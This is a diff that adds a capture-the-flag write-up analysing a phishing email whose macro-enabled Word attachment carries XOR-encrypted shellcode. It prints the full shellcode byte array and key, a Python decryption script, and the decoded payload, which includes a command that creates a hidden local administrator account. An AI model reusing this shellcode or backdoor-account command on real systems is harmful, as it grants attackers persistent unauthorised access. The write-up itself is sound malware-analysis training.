@@ -248,3 +248,133 @@ CopyEdit
   "flag": "THM{uplink_channel_confirmed}"
 }
 ```
+
+## ORCAM
+
+### Description:
+
+> Dr. Ayaka Hirano loves to swim with the sharks. 
+> So when the attackers from Virelia successfully retaliated against one of our own, it was up to the good doctor to take on the case. 
+> Will Dr. Hirano be able to determine how this attack happened in the first place?
+> 
+> Artifact: `Writing_Template.eml`
+
+### Objective
+
+Analyze the provided **`.eml`** file (email) and uncover the hidden flag in the format **`THM{...}`**
+
+## Step 1: Analyzing the Email (Writing_Template.eml)
+
+The email contains:
+
+- **Sender:** **`he1pdesk@orcam.thm`**
+- **Recipient:** **`admin@orcam.thm`**
+- **Subject:** **`Project Template`**
+- **Body:**
+    
+    > "Please use the following template for the upcoming Project. The file will not work unless you open it using administrative privileges. When prompted, enable macros in order to get all of the details."
+    > 
+- Attachment:`Project_Template.docm`(a Word document with macros enabled).
+
+### **Observations:**
+
+- The email is suspicious because:
+    - It urges the recipient to enable macros (a common malware delivery method).
+    - It asks for administrative privileges (unusual for a simple document).
+- The **`.docm`** extension confirms it contains macros.
+
+```bash
+cat writing_template.eml 
+Content-Type: multipart/mixed; boundary="===============7147510528207607842=="
+MIME-Version: 1.0
+From: he1pdesk@orcam.thm
+To: admin@orcam.thm
+Subject: Project Template
+
+--===============7147510528207607842==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+
+Please use the following template for the upcoming Project. The file will not work unless you open it using administrative privileges. When prompted, enable macros in order to get all of the details.
+--===============7147510528207607842==
+Content-Type: application/octet-stream
+MIME-Version: 1.0
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Project_Template.docm"
+<---------------------------SNIP------------------------------->
+```
+
+I extracted the email attachment by copying the base64 text from the `.eml`  file and decoding it into another file:
+
+```bash
+cat artifact.txt | base64 -d > Project_Template.docm 
+```
+
+## Step 2: Extracting the Malicious Macro
+
+Since opening the file in LibreOffice gave macro errors, we need to manually inspect the VBA code.
+
+### Key Findings in the Macro:
+
+The document looked like this:
+
+![Opening_the_Attachment.png](/assets/images/THM/Orcam/Opening_the_Attachment.png)
+
+I then went ahead to open Macros:
+
+![Uncovered Macros.png](/assets/images/THM/Orcam/Uncovered_Macros.png)
+
+## **Step 3: Decrypting the Shellcode**
+
+The shellcode is hidden in the **`buf`** array, XOR-encrypted with **`"l33t"`**.
+
+### **Python Decryption Script:**
+
+I copied this Section of the code and tried to decode it using this python script:
+
+```bash
+buf = [144,219,177,116,108,51,83,253,137,2,243,16,231,99,3,255,62,63,184,38,120,184,65,92,99,132,121,82,93,204,159,72,13,79,49,88,76,242,252,121,109,244,209,134,62,100,184,38,124,184,121,72,231,127,34,12,143,123,50,165,61,184,106,84,109,224,184,61,116,208,9,61,231,7,184,117,186,2,204,216,173,252,62,117,171,11,211,1,154,48,78,140,87,78,23,1,136,107,184,44,72,50,224,18,231,63,120,255,52,47,50,167,231,55,184,117,188,186,119,80,72,104,104,21,53,105,98,139,140,108,108,46,231,33,216,249,49,89,50,249,233,129,51,116,108,99,91,69,231,92,180,139,185,136,211,105,70,57,91,210,249,142,174,139,185,15,53,8,102,179,200,148,25,54,136,51,127,65,92,30,108,96,204,161,2,86,71,84,25,64,86,6,76,82,87,25,5,93,90,7,24,65,65,21,24,92,65,84,58,118,91,58,9,3,101,70,33,100,75,18,56,102,113,48,15,89,113,77,76,28,82,16,8,19,28,45,76,21,19,26,9,71,19,24,3,80,82,24,11,65,92,1,28,19,82,16,1,90,93,29,31,71,65,21,24,92,65,7,76,82,87,25,5,93,90,7,24,65,65,21,24,92,65,84,67,82,87,16,108]
+
+key = "l33t"
+decrypted = []
+
+for i in range(len(buf)):
+    decrypted.append(buf[i] ^ ord(key[i % len(key)]))
+
+# Convert to bytes
+shellcode = bytes(decrypted)
+
+# Print as string to look for THM{...}
+print(shellcode.decode('ascii', errors='ignore'))
+```
+
+The key used above was found on the Macros.
+
+### Output Analysis:
+
+Running the script reveals:
+
+```bash
+ubuntu@tryhackme:~$ nano decrypt.py
+ubuntu@tryhackme:~$ python3 decrypt.py 
+`1dP0R
+8u};}$uXX$fI:I41 
+           KXD$$[[aYZQ__Z]jPh1o*
+h<|
+uGrojSnet user administrrator VEhNe0V2MWxfTUBDcjB9 /add /Y & net localgroup administrators administrrator /add
+ubuntu@tryhackme:~$ echo "VEhNe0V2MWxfTUBDcjB9" | base64 -d
+ubuntu@tryhackme:~$ ls
+Desktop  Documents  Downloads  Music  Pictures  Project_Template.docm  Public  Templates  Videos  artifact.txt  decrypt.py  snap
+ubuntu@tryhackme:~$ echo "VEhNe0V2MWxfTUBDcjB9" | base64 -d              
+THM{Ev1l_M@Cr0}ubuntu@tryhackme:~$    
+```
+
+### Summary of the Investigation
+
+1. **Delivery Method:** Phishing email with a malicious Word attachment.
+2. **Execution Trigger:** Auto-executing macro (**`Document_Open()`** and **`AutoOpen()`**).
+3. **Payload:** XOR-encrypted shellcode (key: **`"l33t"`**).
+4. **Malicious Actions:**
+    - Creates a backdoor admin user (**`administrrator`**).
+    - Contains the flag in base64 (**`VEhNe0V2MWxfTUBDcjB9`** → **`THM{Ev1l_M@Cr0}`**).
